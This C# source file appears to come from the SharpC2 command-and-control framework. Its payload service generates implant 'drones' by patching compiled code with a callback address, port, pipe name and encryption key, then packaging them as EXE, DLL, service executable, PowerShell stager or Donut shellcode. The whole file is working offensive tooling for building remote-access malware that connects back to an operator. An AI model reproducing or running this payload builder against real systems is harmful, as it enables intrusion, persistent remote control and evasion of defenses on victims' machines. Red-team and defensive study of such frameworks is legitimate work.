using System.Text;

using dnlib.DotNet;
using dnlib.DotNet.Emit;
using dnlib.DotNet.Writer;
using dnlib.PE;

using Donut;
using Donut.Structs;

using TeamServer.Handlers;
using TeamServer.Interfaces;
using TeamServer.Utilities;

namespace TeamServer.Services;

public class PayloadService : IPayloadService
{
    private readonly ICryptoService _crypto;

    public PayloadService(ICryptoService crypto)
    {
        _crypto = crypto;
    }

    public async Task<byte[]> GeneratePayload(Handler handler, PayloadFormat format)
    {
        byte[] drone;

        // generate the assembly
        switch (handler.PayloadType)
        {
            case PayloadType.REVERSE_HTTP:
            {
                var httpHandler = (HttpHandler)handler;
                drone = await GenerateHttpDrone(httpHandler.ConnectAddress, httpHandler.ConnectPort);
                
                break;
            }

            case PayloadType.REVERSE_HTTPS:
            {
                var httpsHandler = (HttpHandler)handler;
                drone = await GenerateHttpsDrone(httpsHandler.ConnectAddress, httpsHandler.ConnectPort);
                
                break;
            }

            case PayloadType.BIND_PIPE:
            {
                var smbHandler = (SmbHandler)handler;
                drone = await GenerateBindSmbDrone(smbHandler.PipeName);
                
                break;
            }

            case PayloadType.BIND_TCP:
            {
                var bindTcpHandler = (TcpHandler)handler;
                drone = await GenerateBindTcpDrone(bindTcpHandler.Port, bindTcpHandler.Loopback);
                
                break;
            }

            case PayloadType.REVERSE_TCP:
            {
                var reverseTcpHandler = (TcpHandler)handler;
                drone = await GenerateReverseTcpDrone(reverseTcpHandler.Address, reverseTcpHandler.Port);
                
                break;
            }
            
            case PayloadType.EXTERNAL:
                throw new NotImplementedException();
            
            default:
                throw new ArgumentOutOfRangeException();
        }
        
        // convert to correct format
        return format switch
        {
            PayloadFormat.EXE => await BuildExe(drone),
            PayloadFormat.DLL => BuildDll(drone),
            PayloadFormat.SVC_EXE => await BuildServiceExe(drone),
            PayloadFormat.POWERSHELL => await BuildPowerShellScript(drone),
            PayloadFormat.SHELLCODE => await BuildShellcode(drone),
            
            _ => throw new ArgumentOutOfRangeException(nameof(format), format, null)
        };
    }

    private async Task<byte[]> GenerateHttpDrone(string connectAddress, int connectPort)
    {
        var drone = await GetDroneModule();
        
        // get the http handler
        var httpCommModuleDef = GetTypeDef(drone, "Drone.CommModules.HttpCommModule");
        
        // set schema
        var schemaDef = GetMethodDef(httpCommModuleDef, "System.String Drone.CommModules.HttpCommModule::get_Schema()");
        schemaDef.Body.Instructions[0].Operand = "http";
        
        // set connect address
        var connectAddressDef = GetMethodDef(httpCommModuleDef, "System.String Drone.CommModules.HttpCommModule::get_ConnectAddress()");
        connectAddressDef.Body.Instructions[0].Operand = connectAddress;
        
        // set connect port
        var connectPortDef = GetMethodDef(httpCommModuleDef, "System.String Drone.CommModules.HttpCommModule::get_ConnectPort()");
        connectPortDef.Body.Instructions[0].Operand = connectPort.ToString();
        
        await using var ms = new MemoryStream();
        drone.Write(ms);

        return ms.ToArray();
    }
    
    private async Task<byte[]> GenerateHttpsDrone(string connectAddress, int connectPort)
    {
        var drone = await GetDroneModule();
        
        // get the http comm module
        var httpCommModuleDef = GetTypeDef(drone, "Drone.CommModules.HttpCommModule");
        
        // set schema
        var schemaDef = GetMethodDef(httpCommModuleDef, "System.String Drone.CommModules.HttpCommModule::get_Schema()");
        schemaDef.Body.Instructions[0].Operand = "https";
        
        // set connect address
        var connectAddressDef = GetMethodDef(httpCommModuleDef, "System.String Drone.CommModules.HttpCommModule::get_ConnectAddress()");
        connectAddressDef.Body.Instructions[0].Operand = connectAddress;
        
        // set connect port
        var connectPortDef = GetMethodDef(httpCommModuleDef, "System.String Drone.CommModules.HttpCommModule::get_ConnectPort()");
        connectPortDef.Body.Instructions[0].Operand = connectPort.ToString();
        
        await using var ms = new MemoryStream();
        drone.Write(ms);

        return ms.ToArray();
    }

    private async Task<byte[]> GenerateBindSmbDrone(string pipeName)
    {
        var drone = await GetDroneModule();
        
        // get the smb comm module
        var smbCommModuleDef = GetTypeDef(drone, "Drone.CommModules.SmbCommModule");
        
        // set pipename
        var pipeNameDef = GetMethodDef(smbCommModuleDef, "System.String Drone.CommModules.SmbCommModule::get_PipeName()");
        pipeNameDef.Body.Instructions[0].Operand = pipeName;
        
        // get main comm module
        var droneDef = GetTypeDef(drone, "Drone.Drone");
        var getCommModuleDef = GetMethodDef(droneDef, "Drone.CommModules.CommModule Drone.Drone::GetCommModule()");
        
        // smb module ctor
        var smbCommModuleCtor = GetMethodDef(smbCommModuleDef, "System.Void Drone.CommModules.SmbCommModule::.ctor()");
        
        // set main comm module
        getCommModuleDef.Body.Instructions[0].Operand = smbCommModuleCtor;
        
        await using var ms = new MemoryStream();
        drone.Write(ms);

        return ms.ToArray();
    }

    private async Task<byte[]> GenerateBindTcpDrone(int bindPort, bool loopback)
    {
        var drone = await GetDroneModule();
        
        // get the tcp comm module
        var tcpCommModuleDef = GetTypeDef(drone, "Drone.CommModules.TcpCommModule");

        // set port
        var portDef = GetMethodDef(tcpCommModuleDef, "System.Int32 Drone.CommModules.TcpCommModule::get_BindPort()");
        portDef.Body.Instructions[0].Operand = bindPort.ToString();
        
        // set loopback
        var loopbackDef = GetMethodDef(tcpCommModuleDef, "System.Boolean Drone.CommModules.TcpCommModule::get_Loopback()");
        loopbackDef.Body.Instructions[0].OpCode = loopback ? OpCodes.Ldc_I4_1 : OpCodes.Ldc_I4_0;
        
        // get main comm module
        var droneDef = GetTypeDef(drone, "Drone.Drone");
        var getCommModuleDef = GetMethodDef(droneDef, "Drone.CommModules.CommModule Drone.Drone::GetCommModule()");
        
        // tcp module ctor
        var tcpCommModuleCtor = GetMethodDef(tcpCommModuleDef, "System.Void Drone.CommModules.TcpCommModule::.ctor()");
        
        // set main comm module
        getCommModuleDef.Body.Instructions[0].Operand = tcpCommModuleCtor;
        
        await using var ms = new MemoryStream();
        drone.Write(ms);

        return ms.ToArray();
    }

    private async Task<byte[]> GenerateReverseTcpDrone(string connectAddress, int connectPort)
    {
        throw new NotImplementedException();
    }

    private static async Task<byte[]> BuildExe(byte[] drone)
    {
        var stager = await Helpers.GetEmbeddedResource("exe_stager.exe");
        
        var module = ModuleDefMD.Load(stager);
        module.Resources.Add(new EmbeddedResource("drone", drone));
        module.Name = "drone.exe";

        using var ms = new MemoryStream();
        module.Write(ms);

        return ms.ToArray();
    }
    
    private static byte[] BuildDll(byte[] drone)
    {
        var module = ModuleDefMD.Load(drone);
        module.Name = "drone.dll";
        
        var programDef = GetTypeDef(module, "Drone.Program");
        var execDef = GetMethodDef(programDef, "System.Threading.Tasks.Task Drone.Program::Execute()");

        // add unmanaged export
        execDef.ExportInfo = new MethodExportInfo();
        execDef.IsUnmanagedExport = true;

        var opts = new ModuleWriterOptions(module)
        {
            PEHeadersOptions =
            {
                Machine = Machine.AMD64
            },
            Cor20HeaderOptions =
            {
                Flags = 0
            }
        };

        using var ms = new MemoryStream();
        module.Write(ms, opts);

        return ms.ToArray();
    }
    
    private static async Task<byte[]> BuildServiceExe(byte[] drone)
    {
        var shellcode = await BuildShellcode(drone);
        var stager = await Helpers.GetEmbeddedResource("svc_stager.exe");
        
        var module = ModuleDefMD.Load(stager);
        module.Resources.Add(new EmbeddedResource("drone", shellcode));
        module.Name = "drone_svc.exe";

        using var ms = new MemoryStream();
        module.Write(ms);

        return ms.ToArray();
    }
    
    private static async Task<byte[]> BuildPowerShellScript(byte[] drone)
    {
        // build exe
        var exe = await BuildExe(drone);
        
        // get stager ps1
        var stager = await Helpers.GetEmbeddedResource("stager.ps1");
        var stagerText = Encoding.ASCII.GetString(stager);

        // insert exe
        stagerText = stagerText.Replace("{{DATA}}", Convert.ToBase64String(exe));
        
        // remove ZWNBSP
        stagerText = stagerText.Remove(0, 3);

        return Encoding.ASCII.GetBytes(stagerText);
    }

    private static async Task<byte[]> BuildShellcode(byte[] drone)
    {
        var tmpShellcodePath = Path.GetTempFileName().Replace(".tmp", ".bin");
        var tmpPayloadPath = Path.GetTempFileName().Replace(".tmp", ".exe");
        
        // write drone to disk
        await File.WriteAllBytesAsync(tmpPayloadPath, drone);
        
        // donut config
        var config = new DonutConfig
        {
            Arch = 3, // x86+amd64
            Bypass = 1, // none
            Domain = "SharpC2",
            Class = "Drone.Program",
            Method = "Execute",
            InputFile = tmpPayloadPath,
            Payload = tmpShellcodePath
        };
        
        // generate shellcode
        Generator.Donut_Create(ref config);
        var shellcode = await File.ReadAllBytesAsync(tmpShellcodePath);
        
        // delete temp files
        File.Delete(tmpShellcodePath);
        File.Delete(tmpPayloadPath);
        File.Delete($"{tmpShellcodePath}.b64");

        return shellcode;
    }
    
    private async Task<ModuleDef> GetDroneModule()
    {
        var bytes = await Helpers.GetEmbeddedResource("drone.dll");
        var module = ModuleDefMD.Load(bytes);

        // write in crypto key
        var key = await _crypto.GetKey();

        var cryptoClass = GetTypeDef(module,"Drone.Utilities.Crypto");
        var keyMethod = GetMethodDef(cryptoClass, "System.Byte[] Drone.Utilities.Crypto::get_Key()");
        keyMethod.Body.Instructions[0].Operand = Convert.ToBase64String(key);

        return module;
    }
    
    private static TypeDef GetTypeDef(ModuleDef module, string name)
    {
        return module.Types.Single(t => t.FullName.Equals(name, StringComparison.OrdinalIgnoreCase));
    }
    
    private static MethodDef GetMethodDef(TypeDef type, string name)
    {
        return type.Methods.Single(m => m.FullName.Equals(name, StringComparison.OrdinalIgnoreCase));
    }
}